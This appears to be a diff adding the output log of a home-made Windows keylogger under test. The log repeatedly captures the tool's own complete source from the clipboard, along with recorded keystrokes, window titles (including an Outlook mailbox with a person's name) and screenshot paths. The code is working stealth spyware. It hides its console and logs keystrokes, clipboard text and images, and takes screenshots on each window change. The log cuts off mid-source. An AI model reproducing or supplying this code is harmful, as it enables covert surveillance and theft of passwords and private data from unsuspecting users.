@@ -1,0 +1,1733 @@
+
+
+--- Logging started: 2025-04-12 18:59:12.468388 ---
+
+
+[2025-04-12 18:59:13.970736] 📋 Copied text:
+"""
+full_logger.py  –  Stealth key + clipboard (text & image) logger
+────────────────────────────────────────────────────────────────
+• Keystrokes in one line, window headers on change
+• Clipboard text   → logged
+• Clipboard image  → saved as PNG + logged
+• Screenshots on window change
+• Stop with ESC
+"""
+
+import os, io, time, ctypes, hashlib
+from datetime import datetime
+from threading import Thread
+import threading
+
+from pynput import keyboard
+import win32gui, win32process, win32clipboard
+import psutil
+from PIL import Image, ImageGrab
+
+# ── Configuration ──────────────────────────────────────────────────
+LOG_DIR  = r"C:\Users\asus\keylogger"
+LOG_FILE = os.path.join(LOG_DIR, "system_log.txt")
+CLIPBOARD_POLL_INTERVAL = 1.5     # seconds
+
+# Ensure base directory exists
+os.makedirs(LOG_DIR, exist_ok=True)
+
+# Hide console window (comment the next line while debugging)
+ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+
+# ── Helpers ─────────────────────────────────────────────────────────
+def get_active_window() -> str:
+    try:
+        hwnd  = win32gui.GetForegroundWindow()
+        pid   = win32process.GetWindowThreadProcessId(hwnd)[1]
+        exe   = psutil.Process(pid).name()
+        title = win32gui.GetWindowText(hwnd)
+        return f"[{exe} – {title}]"
+    except Exception as e:
+        return f"[Unknown Window – {e}]"
+
+def get_save_folder() -> str:
+    """
+    Returns …\YYYY‑MM‑DD\HH  (e.g. …\2025-04-12\17)
+    Creates the folders if they don’t exist.
+    """
+    now         = datetime.now()
+    day_folder  = os.path.join(LOG_DIR, now.strftime("%Y-%m-%d"))
+    hour_folder = os.path.join(day_folder, now.strftime("%H"))
+    os.makedirs(hour_folder, exist_ok=True)
+    return hour_folder
+
+def take_screenshot():
+    try:
+        now  = datetime.now()
+        path = os.path.join(
+            get_save_folder(),
+            f"screenshot_{now.strftime('%H%M%S')}.png"
+        )
+        ImageGrab.grab().save(path, "PNG")
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(f"\n[{now}] 📸 Screenshot saved → {path}\n")
+    except Exception as e:
+        print(f"[!] Screenshot error: {e}")
+
+# ── Clipboard watcher thread ────────────────────────────────────────
+last_clip_txt  = ""
+last_clip_hash = None
+
+def clipboard_watcher():
+    global last_clip_txt, last_clip_hash
+    print("[+] Clipboard watcher running...")   # visible only when console not hidden
+
+    while True:
+        time.sleep(CLIPBOARD_POLL_INTERVAL)
+
+        # ----- Text --------------------------------------------------
+        try:
+            win32clipboard.OpenClipboard()
+            if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
+                txt = win32clipboard.GetClipboardData()
+                if txt and txt != last_clip_txt:
+                    last_clip_txt = txt
+                    with open(LOG_FILE, "a", encoding="utf-8") as f:
+                        f.write(f"\n\n[{datetime.now()}] 📋 Copied text:\n{txt}\n")
+            win32clipboard.CloseClipboard()
+        except Exception as e:
+            print(f"[!] Clipboard‑text error: {e}")
+
+        # ----- Image -------------------------------------------------
+        try:
+            win32clipboard.OpenClipboard()
+            if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_DIB):
+                data = win32clipboard.GetClipboardData(win32clipboard.CF_DIB)
+                win32clipboard.CloseClipboard()
+
+                img = Image.open(io.BytesIO(data))
+                img_hash = hashlib.md5(img.tobytes()).hexdigest()
+
+                if img_hash != last_clip_hash:
+                    last_clip_hash = img_hash
+                    ts = datetime.now().strftime("%H%M%S")
+                    img_path = os.path.join(get_save_folder(), f"clip_{ts}.png")
+                    img.save(img_path, "PNG")
+
+                    with open(LOG_FILE, "a", encoding="utf-8") as f:
+                        f.write(f"\n\n[{datetime.now()}] 📸 Image copied → {img_path}\n")
+            else:
+                win32clipboard.CloseClipboard()
+        except Exception as e:
+            print(f"[!] Clipboard‑image error: {e}")
+
+# ── Session header ─────────────────────────────────────────────────
+with open(LOG_FILE, "a", encoding="utf-8") as f:
+    f.write(f"\n\n--- Logging started: {datetime.now()} ---\n")
+
+# ── Keylogger callbacks ────────────────────────────────────────────
+last_window = None
+
+def on_press(key):
+    global last_window
+
+    win = get_active_window()
+    if win != last_window:
+        last_window = win
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(f"\n\n{datetime.now()} {win}\n")
+        threading.Thread(target=take_screenshot, daemon=True).start()  # ✅ Run screenshot in background
+
+    try:
+        k = key.char
+    except AttributeError:
+        if key == keyboard.Key.space:     k = " "
+        elif key == keyboard.Key.enter:   k = "\n"
+        else:                              k = f"[{key.name.upper()}]"
+
+    with open(LOG_FILE, "a", encoding="utf-8") as f:
+        f.write(k)
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        return False  # Stop listener
+
+# ── Launch clipboard thread & key listener ─────────────────────────
+Thread(target=clipboard_watcher, daemon=True).start()
+
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+
+
+2025-04-12 18:59:22.226574 [chrome.exe – ChatGPT - keylogger - Google Chrome]
+he
+[2025-04-12 18:59:22.226998] 📸 Screenshot saved → C:\Users\asus\keylogger\2025-04-12\18\screenshot_185922.png
+llo hgow [BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE]ow are you [CMD][SHIFT_R]S
+
+[2025-04-12 18:59:33.486072] 📸 Image copied → C:\Users\asus\keylogger\2025-04-12\18\clip_185933.png
+
+
+[2025-04-12 18:59:36.496927] 📸 Image copied → C:\Users\asus\keylogger\2025-04-12\18\clip_185936.png
+
+
+2025-04-12 18:59:37.163366 [SnippingTool.exe – Outil Capture d’écran]
+[CTRL_L]
+[2025-04-12 18:59:37.163944] 📸 Screenshot saved → C:\Users\asus\keylogger\2025-04-12\18\screenshot_185937.png
+
+
+2025-04-12 18:59:40.302752 [Code.exe – keylogger.py - keylogger - Visual Studio Code]
+[ESC]
+[2025-04-12 18:59:40.303223] 📸 Screenshot saved → C:\Users\asus\keylogger\2025-04-12\18\screenshot_185940.png
+
+
+--- Logging started: 2025-04-12 19:02:47.952995 ---
+
+
+[2025-04-12 19:02:49.454816] 📋 Copied text:
+"""
+full_logger.py  –  Stealth key + clipboard (text & image) logger
+────────────────────────────────────────────────────────────────
+• Keystrokes in one line, window headers on change
+• Clipboard text   → logged
+• Clipboard image  → saved as PNG + logged
+• Screenshots on window change
+• Stop with ESC
+"""
+
+import os, io, time, ctypes, hashlib
+from datetime import datetime
+from threading import Thread
+import threading
+
+from pynput import keyboard
+import win32gui, win32process, win32clipboard
+import psutil
+from PIL import Image, ImageGrab
+
+# ── Configuration ──────────────────────────────────────────────────
+LOG_DIR  = r"C:\Users\asus\keylogger"
+LOG_FILE = os.path.join(LOG_DIR, "system_log.txt")
+CLIPBOARD_POLL_INTERVAL = 1.5     # seconds
+
+# Ensure base directory exists
+os.makedirs(LOG_DIR, exist_ok=True)
+
+# Hide console window (comment the next line while debugging)
+ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+
+# ── Helpers ─────────────────────────────────────────────────────────
+def get_active_window() -> str:
+    try:
+        hwnd  = win32gui.GetForegroundWindow()
+        pid   = win32process.GetWindowThreadProcessId(hwnd)[1]
+        exe   = psutil.Process(pid).name()
+        title = win32gui.GetWindowText(hwnd)
+        return f"[{exe} – {title}]"
+    except Exception as e:
+        return f"[Unknown Window – {e}]"
+
+def get_save_folder() -> str:
+    """
+    Returns …\YYYY‑MM‑DD\HH‑MM‑SS  (e.g. …\2025-04-12\18-42-07)
+    Creates the folders if they don’t exist.
+    """
+    now         = datetime.now()
+    day_folder  = os.path.join(LOG_DIR, now.strftime("%Y-%m-%d"))
+    time_folder = os.path.join(day_folder, now.strftime("%H-%M-%S"))
+    os.makedirs(time_folder, exist_ok=True)
+    return time_folder
+
+def take_screenshot():
+    try:
+        now  = datetime.now()
+        path = os.path.join(
+            get_save_folder(),
+            f"screenshot_{now.strftime('%H%M%S')}.png"
+        )
+        ImageGrab.grab().save(path, "PNG")
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(f"\n[{now}] 📸 Screenshot saved → {path}\n")
+    except Exception as e:
+        print(f"[!] Screenshot error: {e}")
+
+# ── Clipboard watcher thread ────────────────────────────────────────
+last_clip_txt  = ""
+last_clip_hash = None
+
+def clipboard_watcher():
+    global last_clip_txt, last_clip_hash
+    print("[+] Clipboard watcher running...")   # visible only when console not hidden
+
+    while True:
+        time.sleep(CLIPBOARD_POLL_INTERVAL)
+
+        # ----- Text --------------------------------------------------
+        try:
+            win32clipboard.OpenClipboard()
+            if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
+                txt = win32clipboard.GetClipboardData()
+                if txt and txt != last_clip_txt:
+                    last_clip_txt = txt
+                    with open(LOG_FILE, "a", encoding="utf-8") as f:
+                        f.write(f"\n\n[{datetime.now()}] 📋 Copied text:\n{txt}\n")
+            win32clipboard.CloseClipboard()
+        except Exception as e:
+            print(f"[!] Clipboard‑text error: {e}")
+
+        # ----- Image -------------------------------------------------
+        try:
+            win32clipboard.OpenClipboard()
+            if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_DIB):
+                data = win32clipboard.GetClipboardData(win32clipboard.CF_DIB)
+                win32clipboard.CloseClipboard()
+
+                img = Image.open(io.BytesIO(data))
+                img_hash = hashlib.md5(img.tobytes()).hexdigest()
+
+                if img_hash != last_clip_hash:
+                    last_clip_hash = img_hash
+                    ts = datetime.now().strftime("%H%M%S")
+                    img_path = os.path.join(get_save_folder(), f"clip_{ts}.png")
+                    img.save(img_path, "PNG")
+
+                    with open(LOG_FILE, "a", encoding="utf-8") as f:
+                        f.write(f"\n\n[{datetime.now()}] 📸 Image copied → {img_path}\n")
+            else:
+                win32clipboard.CloseClipboard()
+        except Exception as e:
+            print(f"[!] Clipboard‑image error: {e}")
+
+# ── Session header ─────────────────────────────────────────────────
+with open(LOG_FILE, "a", encoding="utf-8") as f:
+    f.write(f"\n\n--- Logging started: {datetime.now()} ---\n")
+
+# ── Keylogger callbacks ────────────────────────────────────────────
+last_window = None
+
+def on_press(key):
+    global last_window
+
+    win = get_active_window()
+    if win != last_window:
+        last_window = win
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(f"\n\n{datetime.now()} {win}\n")
+        threading.Thread(target=take_screenshot, daemon=True).start()  # ✅ Run screenshot in background
+
+    try:
+        k = key.char
+    except AttributeError:
+        if key == keyboard.Key.space:     k = " "
+        elif key == keyboard.Key.enter:   k = "\n"
+        else:                              k = f"[{key.name.upper()}]"
+
+    with open(LOG_FILE, "a", encoding="utf-8") as f:
+        f.write(k)
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        return False  # Stop listener
+
+# ── Launch clipboard thread & key listener ─────────────────────────
+Thread(target=clipboard_watcher, daemon=True).start()
+
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+
+
+2025-04-12 19:02:55.814481 [chrome.exe – ChatGPT - keylogger - Google Chrome]
+dz
+[2025-04-12 19:02:55.815150] 📸 Screenshot saved → C:\Users\asus\keylogger\2025-04-12\19-02-55\screenshot_190255.png
+dadaz
+
+2025-04-12 19:02:58.012251 [Code.exe – keylogger.py - keylogger - Visual Studio Code]
+[ESC]
+[2025-04-12 19:02:58.012753] 📸 Screenshot saved → C:\Users\asus\keylogger\2025-04-12\19-02-58\screenshot_190258.png
+
+
+--- Logging started: 2025-04-12 19:04:15.829663 ---
+
+
+[2025-04-12 19:04:17.332151] 📋 Copied text:
+"""
+full_logger.py  –  Stealth key + clipboard (text & image) logger
+────────────────────────────────────────────────────────────────
+• Keystrokes in one line, window headers on change
+• Clipboard text   → logged
+• Clipboard image  → saved as PNG + logged
+• Screenshots on window change
+• Stop with ESC
+"""
+
+import os, io, time, ctypes, hashlib
+from datetime import datetime
+from threading import Thread
+import threading
+
+from pynput import keyboard
+import win32gui, win32process, win32clipboard
+import psutil
+from PIL import Image, ImageGrab
+
+# ── Configuration ──────────────────────────────────────────────────
+LOG_DIR  = r"C:\Users\asus\keylogger"
+CLIPBOARD_POLL_INTERVAL = 1.5     # seconds
+
+# ── Create session folders ─────────────────────────────────────────
+start_time   = datetime.now()
+day_folder   = os.path.join(LOG_DIR, start_time.strftime("%Y-%m-%d"))
+session_dir  = os.path.join(day_folder,  start_time.strftime("%H-%M-%S"))
+os.makedirs(session_dir, exist_ok=True)
+
+LOG_FILE = os.path.join(LOG_DIR, "system_log.txt")   # text log stays at root
+
+# Hide console window (comment next line while debugging)
+ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+
+# ── Helpers ─────────────────────────────────────────────────────────
+def get_active_window() -> str:
+    try:
+        hwnd  = win32gui.GetForegroundWindow()
+        pid   = win32process.GetWindowThreadProcessId(hwnd)[1]
+        exe   = psutil.Process(pid).name()
+        title = win32gui.GetWindowText(hwnd)
+        return f"[{exe} – {title}]"
+    except Exception as e:
+        return f"[Unknown Window – {e}]"
+
+def save_screenshot():
+    try:
+        ts   = datetime.now().strftime("%H%M%S")
+        path = os.path.join(session_dir, f"screenshot_{ts}.png")
+        ImageGrab.grab().save(path, "PNG")
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(f"\n[{datetime.now()}] 📸 Screenshot saved → {path}\n")
+    except Exception as e:
+        print(f"[!] Screenshot error: {e}")
+
+# ── Clipboard watcher thread ────────────────────────────────────────
+last_clip_txt  = ""
+last_clip_hash = None
+
+def clipboard_watcher():
+    global last_clip_txt, last_clip_hash
+    print("[+] Clipboard watcher running...")   # visible only when console not hidden
+
+    while True:
+        time.sleep(CLIPBOARD_POLL_INTERVAL)
+
+        # ----- Text --------------------------------------------------
+        try:
+            win32clipboard.OpenClipboard()
+            if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
+                txt = win32clipboard.GetClipboardData()
+                if txt and txt != last_clip_txt:
+                    last_clip_txt = txt
+                    with open(LOG_FILE, "a", encoding="utf-8") as f:
+                        f.write(f"\n\n[{datetime.now()}] 📋 Copied text:\n{txt}\n")
+            win32clipboard.CloseClipboard()
+        except Exception as e:
+            print(f"[!] Clipboard‑text error: {e}")
+
+        # ----- Image -------------------------------------------------
+        try:
+            win32clipboard.OpenClipboard()
+            if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_DIB):
+                data = win32clipboard.GetClipboardData(win32clipboard.CF_DIB)
+                win32clipboard.CloseClipboard()
+
+                img = Image.open(io.BytesIO(data))
+                img_hash = hashlib.md5(img.tobytes()).hexdigest()
+
+                if img_hash != last_clip_hash:
+                    last_clip_hash = img_hash
+                    ts = datetime.now().strftime("%H%M%S")
+                    img_path = os.path.join(session_dir, f"clip_{ts}.png")
+                    img.save(img_path, "PNG")
+
+                    with open(LOG_FILE, "a", encoding="utf-8") as f:
+                        f.write(f"\n\n[{datetime.now()}] 📸 Image copied → {img_path}\n")
+            else:
+                win32clipboard.CloseClipboard()
+        except Exception as e:
+            print(f"[!] Clipboard‑image error: {e}")
+
+# ── Session header ─────────────────────────────────────────────────
+with open(LOG_FILE, "a", encoding="utf-8") as f:
+    f.write(f"\n\n--- Logging started: {start_time} ---\n")
+
+# ── Keylogger callbacks ────────────────────────────────────────────
+last_window = None
+
+def on_press(key):
+    global last_window
+
+    win = get_active_window()
+    if win != last_window:
+        last_window = win
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(f"\n\n{datetime.now()} {win}\n")
+        threading.Thread(target=save_screenshot, daemon=True).start()
+
+    try:
+        k = key.char
+    except AttributeError:
+        if key == keyboard.Key.space:     k = " "
+        elif key == keyboard.Key.enter:   k = "\n"
+        else:                              k = f"[{key.name.upper()}]"
+
+    with open(LOG_FILE, "a", encoding="utf-8") as f:
+        f.write(k)
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        return False  # Stop listener
+
+# ── Launch clipboard thread & key listener ─────────────────────────
+Thread(target=clipboard_watcher, daemon=True).start()
+
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+
+
+2025-04-12 19:04:19.665736 [chrome.exe – ChatGPT - keylogger - Google Chrome]
+az
+[2025-04-12 19:04:19.763938] 📸 Screenshot saved → C:\Users\asus\keylogger\2025-04-12\19-04-15\screenshot_190419.png
+eaeze
+
+2025-04-12 19:04:23.849931 [Code.exe – keylogger.py - keylogger - Visual Studio Code]
+[ESC]
+[2025-04-12 19:04:23.924408] 📸 Screenshot saved → C:\Users\asus\keylogger\2025-04-12\19-04-15\screenshot_190423.png
+
+
+--- Logging started: 2025-04-12 19:05:54.612751 ---
+
+
+[2025-04-12 19:05:56.116238] 📋 Copied text:
+"""
+full_logger.py  –  Stealth key + clipboard (text & image) logger
+────────────────────────────────────────────────────────────────
+• Keystrokes in one line, window headers on change
+• Clipboard text   → logged
+• Clipboard image  → saved as PNG + logged
+• Screenshots on window change
+• Stop with ESC
+"""
+
+import os, io, time, ctypes, hashlib
+from datetime import datetime
+from threading import Thread
+import threading
+
+from pynput import keyboard
+import win32gui, win32process, win32clipboard
+import psutil
+from PIL import Image, ImageGrab
+
+# ── Configuration ──────────────────────────────────────────────────
+LOG_DIR  = r"C:\Users\asus\keylogger"
+CLIPBOARD_POLL_INTERVAL = 1.5     # seconds
+
+# ── Create session folders ─────────────────────────────────────────
+start_time   = datetime.now()
+day_folder   = os.path.join(LOG_DIR, start_time.strftime("%Y-%m-%d"))
+session_dir  = os.path.join(day_folder,  start_time.strftime("%H-%M-%S"))
+os.makedirs(session_dir, exist_ok=True)
+
+LOG_FILE = os.path.join(LOG_DIR, "system_log.txt")   # text log stays at root
+
+# Hide console window (comment next line while debugging)
+ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+
+# ── Helpers ─────────────────────────────────────────────────────────
+def get_active_window() -> str:
+    try:
+        hwnd  = win32gui.GetForegroundWindow()
+        pid   = win32process.GetWindowThreadProcessId(hwnd)[1]
+        exe   = psutil.Process(pid).name()
+        title = win32gui.GetWindowText(hwnd)
+        return f"[{exe} – {title}]"
+    except Exception as e:
+        return f"[Unknown Window – {e}]"
+
+def save_screenshot():
+    try:
+        ts   = datetime.now().strftime("%H%M%S")
+        path = os.path.join(session_dir, f"screenshot_{ts}.png")
+        ImageGrab.grab().save(path, "PNG")
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(f"\n[{datetime.now()}] 📸 Screenshot saved → {path}\n")
+    except Exception as e:
+        print(f"[!] Screenshot error: {e}")
+
+# ── Clipboard watcher thread ────────────────────────────────────────
+last_clip_txt  = ""
+last_clip_hash = None
+
+def clipboard_watcher():
+    global last_clip_txt, last_clip_hash
+    print("[+] Clipboard watcher running...")   # visible only when console not hidden
+
+    while True:
+        time.sleep(CLIPBOARD_POLL_INTERVAL)
+
+        # ----- Text --------------------------------------------------
+        try:
+            win32clipboard.OpenClipboard()
+            if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
+                txt = win32clipboard.GetClipboardData()
+                if txt and txt != last_clip_txt:
+                    last_clip_txt = txt
+                    with open(LOG_FILE, "a", encoding="utf-8") as f:
+                        f.write(f"\n\n[{datetime.now()}] 📋 Copied text:\n{txt}\n")
+            win32clipboard.CloseClipboard()
+        except Exception as e:
+            print(f"[!] Clipboard‑text error: {e}")
+
+        # ----- Image -------------------------------------------------
+        try:
+            win32clipboard.OpenClipboard()
+            if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_DIB):
+                data = win32clipboard.GetClipboardData(win32clipboard.CF_DIB)
+                win32clipboard.CloseClipboard()
+
+                img = Image.open(io.BytesIO(data))
+                img_hash = hashlib.md5(img.tobytes()).hexdigest()
+
+                if img_hash != last_clip_hash:
+                    last_clip_hash = img_hash
+                    ts = datetime.now().strftime("%H%M%S")
+                    img_path = os.path.join(session_dir, f"clip_{ts}.png")
+                    img.save(img_path, "PNG")
+
+                    with open(LOG_FILE, "a", encoding="utf-8") as f:
+                        f.write(f"\n\n[{datetime.now()}] 📸 Image copied → {img_path}\n")
+            else:
+                win32clipboard.CloseClipboard()
+        except Exception as e:
+            print(f"[!] Clipboard‑image error: {e}")
+
+# ── Session header ─────────────────────────────────────────────────
+with open(LOG_FILE, "a", encoding="utf-8") as f:
+    f.write(f"\n\n--- Logging started: {start_time} ---\n")
+
+# ── Keylogger callbacks ────────────────────────────────────────────
+last_window = None
+
+def on_press(key):
+    global last_window
+
+    win = get_active_window()
+    if win != last_window:
+        last_window = win
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(f"\n\n{datetime.now()} {win}\n")
+        threading.Thread(target=save_screenshot, daemon=True).start()
+
+    try:
+        k = key.char
+    except AttributeError:
+        if key == keyboard.Key.space:     k = " "
+        elif key == keyboard.Key.enter:   k = "\n"
+        else:                              k = f"[{key.name.upper()}]"
+
+    with open(LOG_FILE, "a", encoding="utf-8") as f:
+        f.write(k)
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        return False  # Stop listener
+
+# ── Launch clipboard thread & key listener ─────────────────────────
+Thread(target=clipboard_watcher, daemon=True).start()
+
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+
+
+2025-04-12 19:06:20.004323 [chrome.exe – TryHackMe | Nmap Basic Port Scans - Google Chrome]
+[MEDIA_VOLUME_UP][MEDIA_VOLUME_UP]
+[2025-04-12 19:06:20.116321] 📸 Screenshot saved → C:\Users\asus\keylogger\2025-04-12\19-05-54\screenshot_190620.png
+[MEDIA_VOLUME_UP][CTRL_L]
+
+2025-04-12 19:06:44.105572 [Code.exe – keylogger.py - keylogger - Visual Studio Code]
+[ESC]
+[2025-04-12 19:06:44.217523] 📸 Screenshot saved → C:\Users\asus\keylogger\2025-04-12\19-05-54\screenshot_190644.png
+
+
+--- Logging started: 2025-04-12 19:09:13.128518 ---
+
+
+[2025-04-12 19:09:14.631177] 📋 Copied text:
+def save_screenshot():
+    try:
+        now      = datetime.now()
+        ts       = now.strftime("%H%M%S")
+        img_name = f"screenshot_{ts}.png"
+        img_path = os.path.join(session_dir, img_name)
+        ImageGrab.grab().save(img_path, "PNG")
+
+        # Log to main log
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(f"\n[{now}] 📸 Screenshot saved → {img_path}\n")
+
+        # Log to summary file
+        summary_path = os.path.join(session_dir, "screenshot_summary.txt")
+        with open(summary_path, "a", encoding="utf-8") as f:
+            f.write(f"[{now}] Screenshot → {img_name} | Window: {last_window}\n")
+
+    except Exception as e:
+        print(f"[!] Screenshot error: {e}")
+
+
+2025-04-12 19:09:34.997159 [Code.exe – ● keylogger.py - keylogger - Visual Studio Code]
+[ESC]
+[2025-04-12 19:09:35.095947] 📸 Screenshot saved → C:\Users\asus\keylogger\2025-04-12\19-09-13\screenshot_190934.png
+
+
+--- Logging started: 2025-04-12 19:10:16.868792 ---
+
+
+[2025-04-12 19:10:18.371411] 📋 Copied text:
+def save_screenshot():
+    try:
+        now      = datetime.now()
+        ts       = now.strftime("%H%M%S")
+        img_name = f"screenshot_{ts}.png"
+        img_path = os.path.join(session_dir, img_name)
+        ImageGrab.grab().save(img_path, "PNG")
+
+        # Log to main log
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(f"\n[{now}] 📸 Screenshot saved → {img_path}\n")
+
+        # Log to summary file
+        summary_path = os.path.join(session_dir, "screenshot_summary.txt")
+        with open(summary_path, "a", encoding="utf-8") as f:
+            f.write(f"[{now}] Screenshot → {img_name} | Window: {last_window}\n")
+
+    except Exception as e:
+        print(f"[!] Screenshot error: {e}")
+
+
+2025-04-12 19:10:19.340126 [chrome.exe – Nmap: - Google Chrome]
+[MEDIA_VOLUME_UP]
+[2025-04-12 19:10:19.430803] 📸 Screenshot saved → C:\Users\asus\keylogger\2025-04-12\19-10-16\screenshot_191019.png
+[MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP]
+
+2025-04-12 19:10:32.455874 [chrome.exe – Courrier - Jasser KHLIFI - Outlook - Google Chrome]
+[MEDIA_VOLUME_DOWN][MEDIA_VOLUME_DOWN]
+[2025-04-12 19:10:32.533064] 📸 Screenshot saved → C:\Users\asus\keylogger\2025-04-12\19-10-16\screenshot_191032.png
+[MEDIA_VOLUME_DOWN][MEDIA_VOLUME_DOWN]
+
+2025-04-12 19:10:42.329339 [Code.exe – ● keylogger.py - keylogger - Visual Studio Code]
+[ESC]
+[2025-04-12 19:10:42.407071] 📸 Screenshot saved → C:\Users\asus\keylogger\2025-04-12\19-10-16\screenshot_191042.png
+
+
+--- Logging started: 2025-04-12 19:22:30.439740 ---
+
+
+[2025-04-12 19:22:31.942236] 📋 Copied text:
+def save_screenshot(window_title):
+    try:
+        now      = datetime.now()
+        ts       = now.strftime("%H%M%S")
+        img_name = f"screenshot_{ts}.png"
+        img_path = os.path.join(session_dir, img_name)
+        ImageGrab.grab().save(img_path, "PNG")
+
+        # Log to main log
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(f"\n[{now}] 📸 Screenshot saved → {img_path}\n")
+
+        # Log to summary file
+        summary_path = os.path.join(session_dir, "screenshot_summary.txt")
+        with open(summary_path, "a", encoding="utf-8") as f:
+            f.write(f"[{now}] Screenshot → {img_name} | Window: {window_title}\n")
+
+    except Exception as e:
+        print(f"[!] Screenshot error: {e}")
+
+
+
+2025-04-12 19:22:49.509447 [chrome.exe – Simple XSS payloads · GitHub - Google Chrome]
+[MEDIA_VOLUME_UP][MEDIA_VOLUME_UP]
+[2025-04-12 19:22:49.633978] 📸 Screenshot saved → C:\Users\asus\keylogger\2025-04-12\19-22-30\screenshot_192249.png
+[MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_DOWN][MEDIA_VOLUME_DOWN][MEDIA_VOLUME_DOWN]
+
+2025-04-12 19:23:02.217619 [Notepad.exe – system_log.txt – Bloc-notes]
+[MEDIA_VOLUME_UP][MEDIA_VOLUME_UP]
+[2025-04-12 19:23:02.324000] 📸 Screenshot saved → C:\Users\asus\keylogger\2025-04-12\19-22-30\screenshot_192302.png
+[MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_DOWN][MEDIA_VOLUME_DOWN]
+
+2025-04-12 19:23:11.274983 [Code.exe – ● keylogger.py - keylogger - Visual Studio Code]
+[ESC]
+[2025-04-12 19:23:11.384789] 📸 Screenshot saved → C:\Users\asus\keylogger\2025-04-12\19-22-30\screenshot_192311.png
+
+
+--- Logging started: 2025-04-12 19:25:33.488341 ---
+
+
+[2025-04-12 19:25:34.991451] 📋 Copied text:
+if win != last_window:
+
+
+
+2025-04-12 19:25:42.732798 [chrome.exe – DeepSeek - Into the Unknown - Google Chrome]
+[MEDIA_VOLUME_UP][MEDIA_VOLUME_UP]
+[2025-04-12 19:25:42.866339] 📸 Screenshot saved → C:\Users\asus\keylogger\2025-04-12\19-25-33\screenshot_192542.png
+[MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP][MEDIA_VOLUME_UP]hello am ggonna send u my k[BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE]u a python script and tell me what is it w[BACKSPACE]and h[BACKSPACE]ur rate out of 
+
+--- Logging started: 2025-04-12 19:29:12.384598 ---
+
+
+[2025-04-12 19:29:13.887839] 📋 Copied text:
+"""
+full_logger.py  –  Stealth key + clipboard (text & image) logger
+────────────────────────────────────────────────────────────────
+• Keystrokes in one line, window headers on change
+• Clipboard text   → logged
+• Clipboard image  → saved as PNG + logged
+• Screenshots on window change (one session folder per run)
+• Stop with ESC
+"""
+
+import os, io, time, ctypes, hashlib
+from datetime import datetime
+from threading import Thread
+import threading
+
+from pynput import keyboard
+import win32gui, win32process, win32clipboard
+import psutil
+from PIL import Image, ImageGrab
+
+# ── Configuration ──────────────────────────────────────────────────
+LOG_DIR  = r"C:\Users\asus\keylogger"
+CLIPBOARD_POLL_INTERVAL = 1.5     # seconds
+
+# ── Create session folders ─────────────────────────────────────────
